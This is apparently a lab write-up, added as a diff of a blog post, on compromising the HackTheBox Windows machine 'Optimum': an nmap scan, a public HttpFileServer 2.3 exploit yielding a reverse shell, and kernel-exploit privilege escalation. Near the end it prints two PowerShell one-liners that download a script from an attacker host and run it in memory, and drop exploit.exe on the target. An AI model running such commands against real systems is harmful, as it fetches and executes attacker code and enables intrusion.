@@ -1,0 +1,103 @@
+---
+title: "Optimum from HackTheBox"
+author: ferbot
+date: 2020-01-01 12:00:00 +0800
+categories: [htb, windows, optimum]
+tags: [htb, windows, metasploit, hfs, powershell]
+description: Easy Windows box from HTB about simple exploitation
+---
+
+### HTB: Optimum
+
+I have always thought Windows machines are harder than linux, at least when refering to privilege escalation. User shell was pretty straight forward as there was only one port and only one external service running. I was lucky as Windows privesc tends to be more difficult and got root as second try.
+
+### Initial foothold
+
+An intense nmap scan to get a first hint on the machine.
+
+```bash
+nmap -Pn -p- -sV --max-retries=1 --min-rate=1000 10.10.10.8
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-01 11:38 EST
+Nmap scan report for 10.10.10.8
+Host is up (0.16s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
+Nmap done: 1 IP address (1 host up) scanned in 139.75 seconds
+```
+
+Just one port, huh. At least there's just one way in so all of our effort will go into that one single port.
+
+### Enumeration
+
+By visiting web site, we identify HttpFileServer (version 2.3) is running on port 80; confirming what nmap result told us.
+
+![placeholder](/assets/img/htb/optimum/1.png "HFS")
+![placeholder](/assets/img/htb/optimum/2.png "HFS")
+
+We got a service name and version, time to look for any exploit or vulnerabilities.
+
+![placeholder](/assets/img/htb/optimum/3.png "searchsploit")
+
+We spot a python [exploit](https://www.exploit-db.com/exploits/39161) in the searchsploit results. We then go and take a look to see how to exploit the vulnerable service.
+
+![placeholder](/assets/img/htb/optimum/4.png "exploit")
+
+### Exploitation
+
+Here's a brief explanation of how the exploit works: HFS allows us to upload files directly to the windows file system; in this case anonymously because there's no authentication. The exploit creates a vbs script inside the machine that goes and download netcat from our machine (in order to do that we must create a web server) and deliver a reverse shell back to us.
+
+In order to achieve this we set up a simple HTTP server on python with netcat on its root.
+
+![placeholder](/assets/img/htb/optimum/5.png "http.server")
+
+We setup local IP and listening port.
+
+![placeholder](/assets/img/htb/optimum/6.png "Reverse shell data")
+
+We start our listener and execute our modified script.
+
+![placeholder](/assets/img/htb/optimum/7.png "reverse shell!")
+
+Nice! We get low-privs command execution!
+
+### Privilege Escalation
+
+There are plenty methods to check for misconfigurations in order to escalate privileges. I always start with some kernel exploits (most common among CTFs). I recommend to you the windows exploit suggester [repo](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) as an initial step.
+
+The exploit suggester can take as input the systeminfo command output.
+
+![placeholder](/assets/img/htb/optimum/8.png "systeminfo")
+
+![placeholder](/assets/img/htb/optimum/9.png "exploit-suggester")
+
+We try first privilege escalation [exploit](https://www.exploit-db.com/exploits/41015) on the list.
+
+![placeholder](/assets/img/htb/optimum/11.png "CVE-2016-7255")
+
+That first try did not work, but we don't stop there. So let's try the [next one](https://www.exploit-db.com/exploits/41020).
+
+![placeholder](/assets/img/htb/optimum/10.png "exploit-suggester")
+
+To download files we use some powershell oneliners.
+This allows us to read some external powershell file and immediately execute without downloading it.
+```cmd
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.32/hval.ps1')
+```
+
+This one downloads the file directly to the path of choice.
+```cmd
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.32/exploit.exe', 'C:\Users\kostas\Downloads\exploit.exe')
+```
+
+![placeholder](/assets/img/htb/optimum/12.png "rooted!")
+
+We are able to escalate our privileges.
+
+### Thank you
+
+As we, you the reader and I the writer, advance deeper into these HTB boxes I will continue to learn and add enumeration and exploit methods. I'm not the best but I try harder almost every day to be better and improve myself into hacking.
+Any feedback is welcomed. As always thank you for reading!
